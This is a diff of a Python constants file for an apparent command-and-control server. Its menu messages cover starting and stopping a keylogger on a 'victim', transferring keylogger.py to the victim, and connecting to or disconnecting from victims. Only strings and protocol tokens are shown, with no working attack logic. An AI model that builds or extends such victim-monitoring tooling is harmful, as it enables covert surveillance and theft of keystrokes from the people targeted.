@@ -50,7 +50,35 @@ PERFORM_MENU_ITEM_TWELVE = 12
 PERFORM_MENU_ITEM_THIRTEEN = 13
 MIN_MENU_ITEM_VALUE = 1
 MAX_MENU_ITEM_VALUE = 13
+BYTE_LIMIT = 1024
 MENU_ACTION_START_MSG = "\n[+] ACTION SELECTED: Now performing menu item {}:"
+
+# GENERAL CONSTANTS
+CLIENT_LIST_EMPTY_ERROR = ("[+] ERROR: The command server is not connected to any clients! (TIP: Consider using "
+                           "menu item 12)")
+CLIENT_RESPONSE = "[+] Client says: {}"
+
+
+# MENU ITEM 1 - Start Keylogger constants
+START_KEYLOG_INITIAL_MSG = "[+] Now starting keylogger on the client/victim side..."
+START_SEND_SIGNAL_MSG = ("[+] SENDING SIGNAL: Sending a signal to get client/victim to check if they have {}"
+                         " installed... ({}, {})")
+START_SIGNAL_RECEIVED_MSG = "[+] SIGNAL RECEIVED: Client/victim is now checking if {} is installed on their machine..."
+START_SIGNAL_SEND_FILE_NAME = "[+] SENDING DATA: Now sending file name {} to victim/client..."
+AWAIT_START_RESPONSE_MSG = "[+] Awaiting response..."
+START_KEYLOG_MSG = "START"
+CHECK_KEYLOG = "CHECK"
+KEYLOG_FILE_CHECK_ERROR = "[+] ERROR: An error has occurred while checking if client/victim has {} : {}"
+STATUS_TRUE = "TRUE"
+STATUS_FALSE = "FALSE"
+START_SIGNAL_EXECUTE_KEYLOG = "[+] SENDING SIGNAL: Sending a signal to client/victim to execute {}"
+MISSING_KEYLOG_FILE_MSG = "[+] TIP: Enter the number 3 to initiate a transfer of the keylog file to client/victim"
+
+
+# MENU ITEM 2 - Stop Keylogger constants
+STOP_KEYLOGGER_PROMPT = ("[+] ERROR: This option can only be called when starting a keylogger (menu option 1) "
+                         "on victim/client")
+
 
 # MENU ITEM 5 - DISCONNECT Constants
 DISCONNECT_FROM_VICTIM_MSG = "[+] DISCONNECTING FROM VICTIM: Now disconnecting from victim {}..."
@@ -58,6 +86,7 @@ DISCONNECT_FROM_VICTIM_SUCCESS = "[+] DISCONNECT SUCCESSFUL: Disconnection was s
 DISCONNECT_FROM_VICTIM_ERROR = "[+] DISCONNECT ERROR: There is no such client/victim to disconnect from!"
 ENTER_TARGET_IP_DISCONNECT_PROMPT = "[+] Enter victim IP address to disconnect from: "
 ENTER_TARGET_PORT_DISCONNECT_PROMPT = "[+] Enter victim port to disconnect from: "
+
 
 # MENU ITEM 3 - TRANSFER KEYLOG Constants
 KEYLOG_FILE_NAME = "keylogger.py"
@@ -71,8 +100,9 @@ VICTIM_ACK = "ACK"
 TARGET_VICTIM_NOT_FOUND = "[+] ERROR: Target victim not found!"
 ENTER_TARGET_IP_FIND_PROMPT = "[+] Enter the target (victim) IP address to transfer file to: "
 ENTER_TARGET_PORT_FIND_PROMPT = "[+] Enter the target (victim) port to transfer file to: "
-NO_CONNECTED_CLIENTS_ERROR = ("[+] ERROR: Cannot transfer keylog file! : The command server is not "
-                              "connected to any clients")
+FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR = ("[+] ERROR: Cannot transfer keylog file! : The command server is not "
+                                            "connected to any clients")
+
 
 # MENU ITEM 12 - Connect to a specific victim
 INVALID_INPUT_ERROR = "[+] ERROR: Invalid format for either IP address or port number was provided : {}"
